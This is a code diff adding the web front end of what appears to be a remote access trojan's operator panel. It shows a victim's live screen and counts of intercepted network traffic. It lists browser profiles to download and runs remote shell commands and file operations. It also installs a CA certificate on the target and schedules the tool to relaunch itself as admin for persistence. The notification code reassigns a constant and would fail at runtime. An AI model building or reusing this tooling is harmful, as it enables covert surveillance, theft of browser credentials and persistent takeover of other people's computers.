+                    } else if (s.type === 'color') {
+                        const col = document.createElement('input');
+                        col.type = 'color';
+                        col.value = s.value.startsWith('#') ? s.value : '#000000';
+                        col.style.height = '30px';
+                        col.style.width = '50px';
+                        col.style.border = 'none';
+                        col.style.padding = '0';
+                        col.style.background = 'none';
+                        col.onchange = () => api.update_setting(s.name, col.value);
+                        row.appendChild(col);
+                        const span = document.createElement('span');
+                        span.textContent = s.value;
+                        span.style.marginLeft = '10px';
+                        row.appendChild(span);
+                    } else {
+                        const inp = document.createElement('input');
+                        inp.type = 'text';
+                        inp.value = s.value;
+                        inp.style.width = '70%';
+                        const btn = document.createElement('button');
+                        btn.textContent = 'Set';
+                        btn.style.marginLeft = '10px';
+                        btn.onclick = () => api.update_setting(s.name, inp.value);
+                        row.appendChild(inp);
+                        row.appendChild(btn);
+                    }
+                    card.appendChild(row);
+                });
+                container.appendChild(card);
+            }
+        }
+        function displayStreamFrame(b64Data) {
+            const container = document.getElementById('stream-view-container');
+            const img = document.getElementById('stream-img');
+            const ph = document.getElementById('stream-placeholder');
+            img.src = b64Data;
+            img.style.display = 'block';
+            ph.style.display = 'none';
+            // Hide spinner when we get the first frame
+            container.classList.remove('loading'); 
+        }
+        function updateStreamStats(stats) {
+            document.getElementById('stream-mode').textContent = `Mode: ${stats.mode}`;
+            document.getElementById('stream-fps').textContent = `FPS: ${stats.display_fps}`;
+            document.getElementById('stream-buf').textContent = `Buf: ${stats.buffer_size}`;
+        }
+        function updateNetworkStats(stats) {
+            if (!stats) stats = {};
+            const httpList = stats.HTTP || [];
+            const httpsList = stats.HTTPS || [];
+            const dnsList = stats.DNS || [];
+            const httpCount = httpList.length;
+            const httpsCount = httpsList.length;
+            const dnsCount = dnsList.length;
+            const elHttp = document.getElementById('net-http');
+            const elHttps = document.getElementById('net-https');
+            const elDns = document.getElementById('net-dns');
+            if(elHttp) elHttp.textContent = httpCount;
+            if(elHttps) elHttps.textContent = httpsCount;
+            if(elDns) elDns.textContent = dnsCount;
+            const log = document.getElementById('network-log');
+            if (log) {
+                if (httpCount > 0 || httpsCount > 0 || dnsCount > 0) {
+                    const entry = document.createElement('div');
+                    entry.className = 'log-entry';
+                    const timeStr = new Date().toLocaleTimeString();
+                    let details = [];
+                    if(httpCount > 0) details.push(`HTTP:${httpCount}`);
+                    if(httpsCount > 0) details.push(`HTTPS:${httpsCount}`);
+                    if(dnsCount > 0) details.push(`DNS:${dnsCount}`);
+                    entry.innerHTML = `<span class="log-time">[${timeStr}]</span> ${details.join(' | ')}`;
+                    log.appendChild(entry);
+                    log.scrollTop = log.scrollHeight;
+                    if (log.children.length > 100) log.removeChild(log.firstChild);
+                }
+            }
+        }
+        function showBrowserProfiles(profiles) {
+            console.log("showBrowserProfiles called with:", profiles);
+            const tbody = document.getElementById('browser-list-body');
+            const container = document.getElementById('browser-profiles-container');
+            const placeholder = document.getElementById('browser-placeholder');
+            tbody.innerHTML = '';
+            
+            // Hide spinner
+            container.classList.remove('loading');
+
+            if (!profiles || profiles.length === 0) {
+                placeholder.style.display = 'block';
+                container.style.display = 'none';
+                return;
+            }
+            placeholder.style.display = 'none';
+            container.style.display = 'block';
+            profiles.forEach(p => {
+                const tr = document.createElement('tr');
+                tr.style.borderBottom = '1px solid var(--border)';
+                const originalPath = p.path;
+                tr.innerHTML = `
+                    <td style="padding: 10px;">${escapeHtml(p.browser)}</td>
+                    <td style="padding: 10px;">${escapeHtml(p.profile)}</td>
+                    <td style="padding: 10px;">${p.size_mb.toFixed(2)} MB</td>
+                    <td style="padding: 10px;">
+                        <button class="btn-success" data-path="${escapeHtml(originalPath)}" data-profile="${escapeHtml(p.profile)}">📥 Download</button>
+                    </td>
+                `;
+                const btn = tr.querySelector('button');
+                btn.onclick = function() {
+                    const path = this.getAttribute('data-path');
+                    const profile = this.getAttribute('data-profile');
+                    api.download_browser_profile(path, profile);
+                };
+                tbody.appendChild(tr);
+            });
+            switchTab('commands');
+        }
+        function escapeHtml(text) {
+            if (!text) return '';
+            const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' };
+            return String(text).replace(/[&<>"']/g, m => map[m]);
+        }
+        function appendUsbLog(text, tag) {
+            const log = document.getElementById('usb-log');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            let color = 'var(--text-main)';
+            if (tag === 'detect') color = 'var(--info)';
+            if (tag === 'inject') color = 'var(--warning)';
+            if (tag === 'success') color = 'var(--success)';
+            if (tag === 'error') color = 'var(--danger)';
+            if (tag === 'removed') color = 'var(--text-muted)';
+            entry.innerHTML = `<span class="log-time">[${new Date().toLocaleTimeString()}]</span> <span style="color:${color}">${text}</span>`;
+            log.appendChild(entry);
+            log.scrollTop = log.scrollHeight;
+            document.getElementById('usb-status-text').textContent = text;
+        }
+
+        // ==================== NOTIFICATION SYSTEM ====================
+        window.showNotification = function(data) {
+            const container = document.getElementById('notification-container');
+            if (!container) return;
+            const notif = document.createElement('div');
+            const typeClass = 'notif-info';
+            let type = data.type || 'info';
+            if (type === 'danger' || type === 'error') typeClass = 'notif-danger';
+            else if (type === 'success') typeClass = 'notif-success';
+            else if (type === 'warning') typeClass = 'notif-warning';
+            notif.className = `notification ${typeClass}`;
+            const timeStr = new Date(data.timestamp * 1000).toLocaleTimeString();
+            notif.innerHTML = `
+                <div class="notification-header">
+                    <div class="notification-title">${escapeHtml(data.title)}</div>
+                    <button class="notification-close" onclick="this.parentElement.parentElement.remove()">&times;</button>
+                </div>
+                <div class="notification-body">${escapeHtml(data.message)}</div>
+                <div class="notification-footer">${timeStr}</div>
+            `;
+            container.prepend(notif);
+            requestAnimationFrame(() => { notif.classList.add('show'); });
+            setTimeout(() => {
+                if(notif.parentElement) {
+                    notif.classList.remove('show');
+                    setTimeout(() => { if(notif.parentElement) notif.remove(); }, 300);
+                }
+            }, 8000);
+            if (container.children.length > 5) container.removeChild(container.lastChild);
+        };
+
+        // ==================== END NOTIFICATION SYSTEM ====================
+
+        // === UI LOGIC ===
+        function switchTab(tabId) {
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+            const btn = Array.from(document.querySelectorAll('.tab-btn')).find(b => {
+                const onclick = b.getAttribute('onclick');
+                return onclick && onclick.includes(tabId);
+            });
+            if(btn) btn.classList.add('active');
+            const content = document.getElementById('tab-' + tabId);
+            if(content) content.classList.add('active');
+        }
+        function switchSubTab(subTabId) {
+            document.querySelectorAll('.sub-tab-btn').forEach(b => b.classList.remove('active'));
+            document.querySelectorAll('.sub-tab-content').forEach(c => c.classList.remove('active'));
+            const btn = Array.from(document.querySelectorAll('.sub-tab-btn')).find(b => {
+                const onclick = b.getAttribute('onclick');
+                return onclick && onclick.includes(subTabId);
+            });
+            if(btn) btn.classList.add('active');
+            const content = document.getElementById('subtab-' + subTabId);
+            if(content) content.classList.add('active');
+        }
+        function enableControls(enabled) {
+            const btns = document.querySelectorAll('button:not(#start-btn):not(#stop-btn)');
+            const inputs = document.querySelectorAll('input, select');
+            btns.forEach(b => { if(b.id !== 'cancel-btn') b.disabled = !enabled; });
+            inputs.forEach(i => i.disabled = !enabled);
+        }
+        function executeCommand() {
+            const input = document.getElementById('cmd-input');
+            const cmd = input.value.trim();
+            if (!cmd) return;
+            if (!commandHistory.includes(cmd)) commandHistory.push(cmd);
+            historyIndex = commandHistory.length;
+            api.execute_shell(cmd);
+            input.value = '';
+        }
+        function navHistory(dir) {
+            if (commandHistory.length === 0) return;
+            historyIndex += dir;
+            if (historyIndex < 0) historyIndex = 0;
+            if (historyIndex >= commandHistory.length) historyIndex = commandHistory.length - 1;
+            const input = document.getElementById('cmd-input');
+            input.value = commandHistory[commandHistory.length - 1 - historyIndex];
+        }
+        function triggerUpload() { document.getElementById('file-upload-input').click(); }
+        function handleFileUpload(input) {
+            const file = input.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                const b64 = e.target.result.split(',')[1];
+                api.handle_upload_data(file.name, b64, currentPath);
+            };
+            reader.readAsDataURL(file);
+            input.value = '';
+        }
+        function handleCertUpload() {
+            const input = document.getElementById('cert-file-input');
+            const file = input.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                const b64 = e.target.result.split(',')[1];
+                api.cmd_install_ca_cert(b64, file.name);
+            };
+            reader.readAsDataURL(file);
+            input.value = '';
+        }
+        function showContextMenu(x, y) {
+            const menu = document.getElementById('context-menu');
+            menu.style.display = 'block';
+            menu.style.left = x + 'px';
+            menu.style.top = y + 'px';
+        }
+        function ctxAction(action) {
+            if (!selectedFile) return;
+            document.getElementById('context-menu').style.display = 'none';
+            if (action === 'download') api.download_item(selectedFile.path);
+            if (action === 'copy') api.copy_path(selectedFile.path);
+            if (action === 'delete') {
+                if (confirm(`Delete ${selectedFile.name}?`)) api.delete_item_dialog(selectedFile.path);
+            }
+            if (action === 'rename') {
+                const newName = prompt("New name:", selectedFile.name.replace(/^[^\s]+\s/, ''));
+                if (newName) api.rename_item_dialog(selectedFile.path, newName);
+            }
+            if (action === 'preview') previewFile(selectedFile);
+        }
+        window.copyToClipboard = function(text) {
+            if (navigator.clipboard && window.isSecureContext) {
+                navigator.clipboard.writeText(text).then(function() { console.log('✓ Copied to clipboard (Modern API)'); }).catch(function(err) { console.warn('Modern API failed, trying fallback:', err); fallbackCopy(text); });
+            } else { fallbackCopy(text); }
+        };
+        function fallbackCopy(text) {
+            const textArea = document.createElement("textarea");
+            textArea.value = text;
+            textArea.style.top = "0";
+            textArea.style.left = "0";
+            textArea.style.position = "fixed";
+            textArea.style.opacity = "0";
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+            try {
+                const successful = document.execCommand('copy');
+                const msg = successful ? 'successful' : 'unsuccessful';
+                console.log('Fallback Copy: ' + msg);
+            } catch (err) { console.error('Fallback Copy: Oops, unable to copy', err); }
+            document.body.removeChild(textArea);
+        }
+        function previewFile(item) {
+            const area = document.getElementById('preview-area');
+            area.innerHTML = '';
+            api.preview_item(item.path); 
+            area.innerHTML = '<span style="color:var(--text-muted)">Loading preview...</span>';
+        }
+        window.showPreviewData = function(content, type) {
+            const area = document.getElementById('preview-area');
+            area.innerHTML = '';
+            if (type === 'text') {
+                const ta = document.createElement('textarea');
+                ta.className = 'preview-text';
+                ta.value = content;
+                area.appendChild(ta);
+            } else if (type === 'image' && content) {
+                const img = document.createElement('img');
+                img.src = content;
+                area.appendChild(img);
+            } else {
+                area.innerHTML = '<span style="color:var(--text-muted)">No preview available for this file type.</span>';
+            }
+        };
+        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
+        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+        function submitTask() {
+            const data = {
+                task_name: document.getElementById('task-name').value,
+                exe_path: document.getElementById('task-exe-type').value === 'self' ? 'SELF' : document.getElementById('task-exe-path').value,
+                delay: document.getElementById('task-delay').value,
+                delay_unit: document.getElementById('task-unit').value,
+                as_admin: document.getElementById('task-priv').value === 'admin'
+            };
+            api.cmd_add_scheduled_task(data);
+            closeModal('modal-add-task');
+        }
+        function submitTrigger() {
+            const data = {
+                trigger_type: document.getElementById('trig-type').value,
+                exe_path: document.getElementById('trig-action-type').value === 'self' ? 'SELF' : document.getElementById('trig-exe-path').value,
+                file_path: document.getElementById('trig-path').value,
+                trigger_self: document.getElementById('trig-action-type').value === 'self',
+                as_admin: true
+            };
+            api.cmd_add_trigger(data);
+            closeModal('modal-add-trigger');
+        }
+    </script>
+</body>
+</html>
